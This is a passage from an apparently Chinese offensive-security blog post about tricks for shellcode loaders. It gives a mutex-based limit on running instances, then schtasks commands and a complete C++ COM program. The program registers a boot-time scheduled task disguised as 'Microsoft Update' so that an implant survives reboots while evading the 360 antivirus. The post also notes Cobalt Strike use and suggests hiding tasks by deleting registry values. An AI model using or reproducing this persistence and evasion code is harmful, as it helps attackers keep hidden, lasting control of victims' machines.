        system("pause");
        return 0;
    }
打开两个程序，观察效果:  
优化思路:
有时候我们觉得一个进程太少，为了解决这个情况，会考虑允许启动两个进程。
    bool checkMutex() {
        HANDLE hMutex1 = OpenMutex(MUTEX_ALL_ACCESS, FALSE, "MyTestMutex1");
        if (hMutex1 == NULL) {
            CreateMutex(NULL, FALSE, "MyTestMutex1");
            return TRUE;
        }
        HANDLE hMutex2 = OpenMutex(MUTEX_ALL_ACCESS, FALSE, "MyTestMutex2");
        if (hMutex2 == NULL) {
            CreateMutex(NULL, FALSE, "MyTestMutex2");
            return TRUE;
        }
        else {
    #ifdef _DEBUG
            MessageBox(NULL, "Program is already running", 0, 0);
    #endif // DEBUG
            exit(0);
        }
    }
进一步可以优化控制成动态获取进程同时执行的数目，比如设置成读取某个目录下的文件内容、环境变量的值，访问某个高信誉的网站提取留言内容等等多种手段。
## 0x3 重启上线
重启上线有很多种思路，比如放入启动目录、注册服务、劫持DLL等等...
但是重启上线ByPass 360 可能存在一些小困难(实际上非常简单，浅显的方法试试就知道)，这里以大家都熟知的计划任务来达到Bypass 360的目的。
WIndow计划任务的功能用于定时执行执行一些任务，打开`控制面板\系统和安全\管理工具`,找到任务计划程序
重启上线的话可以选择触发器: **计算机启动时(H)**
在GUI界面上操作，360是不拦截的，可以正常添加计划任务`Hello`，不过我测试的时候发现，这个因为卡在开启启动边界，可执行文件不会运行成功，需要增加延时时间再执行。
### 0x3.1 常规用法
比较常规的用法就是利用`schtasks.exe`
查看用法Help
    schtasks /Create /?
    SCHTASKS /Create [/S system [/U username [/P [password]]]]
        [/RU username [/RP password]] /SC schedule [/MO modifier] [/D day]
        [/M months] [/I idletime] /TN taskname /TR taskrun [/ST starttime]
        [/RI interval] [ {/ET endtime | /DU duration} [/K] [/XML xmlfile] [/V1]]
        [/SD startdate] [/ED enddate] [/IT | /NP] [/Z] [/F] [/HRESULT] [/?]
一般用法形式:
    schtasks /create /tn PentestLab /tr "cmd /c whoami" /sc onstart /ru System
`/RU` 指定运行权限  
`/TN` 指定任务名称，一般用名称  
`/TR` 运行程序路径
`/sc` 指定计划任务频率，主要5个情况可用，`ONSTART` `ONIDLE` `ONLOGON` `DAILY` `MINUTE`  
`/delay` 延迟任务执行时间  
常用命令:
    # 计算机启动后，延迟1分钟执行,这个时间实际上可以放长点。
    schtasks /create /tn "Microsoft Update" /tr "cmd /c whoami" /sc onstart /ru System /delay 0001:00
    # 闲置30分钟后执行
    schtasks /create /tn "Microsoft Update" /tr "cmd /c whoami"  /sc onidle  /i 30 /ru System 
    # 任意用户登录后执行
    schtasks /create /tn "Microsoft Update" /tr "cmd /c whoami" /sc onlogon /ru System
    # 每天晚上3点执行
    chtasks /create /tn "Microsoft Update" /tr "cmd /c whoami" /sc daily /st 03:00
    # 每隔20分钟执行一次
    chtasks /create /tn "Microsoft Update" /tr "cmd /c whoami" /sc minute /mo 20
上面这些命令，在Cobalt Strike命令行下执行，360会直接Ban掉的，一般很少使用，主要是了解下功能用于后面的底层调用代码实现。
### 0x3.2 代码实现
代码参考:
笔者主要做了一些改动和参数定义，关于优化和CS插件的具体实现还是希望各位去锻炼下动手能力。
    /********************************************************************
     This sample schedules a task to start Notepad.exe 30 seconds after
     the system is started.
    ********************************************************************/
    #define _WIN32_DCOM
    #include 
    #include 
    #include 
    #include 
    //  Include the task header file.
    #include 
    #pragma comment(lib, "taskschd.lib")
    #pragma comment(lib, "comsupp.lib")
    using namespace std;
    int __cdecl wmain()
    {
        //  ------------------------------------------------------        //  Initialize COM.
        HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
        //  Set general COM security levels.
        hr = CoInitializeSecurity(
            NULL,
            -1,
            NULL,
            NULL,
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            0,
            NULL);
        //  ------------------------------------------------------        //  Create a name for the task.
        LPCWSTR wszTaskName = L"Window Microsoft Update";
        //  Get the Windows directory and set the path to Notepad.exe.
        wstring wstrExecutablePath = L"cmd /c whoami";
        //  Create an instance of the Task Service. 
        ITaskService* pService = NULL;
        hr = CoCreateInstance(CLSID_TaskScheduler,
            NULL,
            CLSCTX_INPROC_SERVER,
            IID_ITaskService,
            (void**)&pService);
        //  Connect to the task service.
        hr = pService->Connect(_variant_t(), _variant_t(),
            _variant_t(), _variant_t());
        //  Get the pointer to the root task folder.  
        //  This folder will hold the new task that is registered.
        ITaskFolder* pRootFolder = NULL;
        hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
        //  If the same task exists, remove it.
        pRootFolder->DeleteTask(_bstr_t(wszTaskName), 0);
        //  Create the task builder object to create the task.
        ITaskDefinition* pTask = NULL;
        hr = pService->NewTask(0, &pTask);
        pService->Release();  // COM clean up.  Pointer is no longer used.
        //  ------------------------------------------------------        //  Get the registration info for setting the identification.
        IRegistrationInfo* pRegInfo = NULL;
        hr = pTask->get_RegistrationInfo(&pRegInfo);
        hr = pRegInfo->put_Author(_bstr_t(L"xq17"));
        pRegInfo->Release();
        //  Create the settings for the task
        ITaskSettings* pSettings = NULL;
        hr = pTask->get_Settings(&pSettings);
        if (FAILED(hr))
        {
            printf("\nCannot get settings pointer: %x", hr);
            pRootFolder->Release();
            pTask->Release();
            CoUninitialize();
            return 1;
        }
        //  Set setting values for the task. 
        hr = pSettings->put_StartWhenAvailable(VARIANT_TRUE);
        pSettings->Release();
        //  ------------------------------------------------------        //  Get the trigger collection to insert the boot trigger.
        ITriggerCollection* pTriggerCollection = NULL;
        hr = pTask->get_Triggers(&pTriggerCollection);
        //  Add the boot trigger to the task.
        ITrigger* pTrigger = NULL;
        hr = pTriggerCollection->Create(TASK_TRIGGER_BOOT, &pTrigger);
        pTriggerCollection->Release();
        IBootTrigger* pBootTrigger = NULL;
        hr = pTrigger->QueryInterface(
            IID_IBootTrigger, (void**)&pBootTrigger);
        pTrigger->Release();
        hr = pBootTrigger->put_Id(_bstr_t(L"Trigger1"));
        // Delay the task to start 30 seconds after system start.  *
        hr = pBootTrigger->put_Delay(_bstr_t(L"PT30S"));
        pBootTrigger->Release();
        //  ------------------------------------------------------        //  Add an Action to the task. This task will execute Notepad.exe.     
        IActionCollection* pActionCollection = NULL;
        //  Get the task action collection pointer.
        hr = pTask->get_Actions(&pActionCollection);
        //  Create the action, specifying it as an executable action.
        IAction* pAction = NULL;
        hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
        pActionCollection->Release();
        IExecAction* pExecAction = NULL;
        //  QI for the executable task pointer.
        hr = pAction->QueryInterface(
            IID_IExecAction, (void**)&pExecAction);
        pAction->Release();
        //  Set the path of the executable
        hr = pExecAction->put_Path(_bstr_t(wstrExecutablePath.c_str()));
        pExecAction->Release();
        //  ------------------------------------------------------        //  Save the task in the root folder.
        IRegisteredTask* pRegisteredTask = NULL;
        VARIANT varPassword;
        varPassword.vt = VT_EMPTY;
        hr = pRootFolder->RegisterTaskDefinition(
            _bstr_t(wszTaskName),
            pTask,
            TASK_CREATE_OR_UPDATE,
            _variant_t(L"Local Service"),
            varPassword,
            TASK_LOGON_SERVICE_ACCOUNT,
            _variant_t(L""),
            &pRegisteredTask);
        printf("\n Success! Task successfully registered. ");
        //  Clean up.
        pRootFolder->Release();
        pTask->Release();
        pRegisteredTask->Release();
        CoUninitialize();
        return 0;
    }
使用效果:
如果直接执行命令会被360拦截。  
编译的release版本360无提示秒过。  
查看计划任务列表，可以看到成功Bypass 360添加。  
* * *
关于这个重启上线的思路有非常多，但是还是希望大家根据网上的想法去动手尝试，成功后不建议直接传播现成利用,emmm，意义不大。至于计划任务除了进一步优化代码的可用性之外，还可以考虑进一步实现计划任务的隐藏，比如删除注册表的index值来隐藏,win7以上的系统则可以进一步删除sid来实现完全隐藏，这些在Github上也有代码实现，但是这部分还是不够简单易用，普适性也可能在一些系统出现问题，还有就是不够全面，emmm，自己动手丰衣足食。
## 0x4 总结
本文内容较为简单直接，主要是围绕三个常用的小技巧来展开介绍，这三个小技巧在本文尚未chain起来，读者可以结合实际的攻防场景，将其融合定制出个性鲜明的ShellCodeLoader,于此同时，读者也可以尝试根据这三个小技巧进行更为深入的学习和利用拓展，这也是笔者后续的一个方向，但是还是希望集思广益，共同进步。
## 0x5 参考链接
[Self Deleting Executables](https://www.codeproject.com/Articles/17052/Self-Deleting-Executables)
[ring0层下实现的文件强制删除](https://www.writebug.com/git/codes?owner=Demon-Gan-123&repo=ring0-irp-force-delete)
[C语言防止程序多开：创建互斥体](https://blog.csdn.net/Rabbit_Gray/article/details/120422178)
[Windows计划任务的进阶](https://payloads.cn/2021/0805/advanced-windows-scheduled-tasks.html)
[Persistence – Scheduled
Tasks](https://pentestlab.blog/2019/11/04/persistence-scheduled-tasks/)
[windows 计划任务隐藏新姿势分享](https://paper.seebug.org/1464/)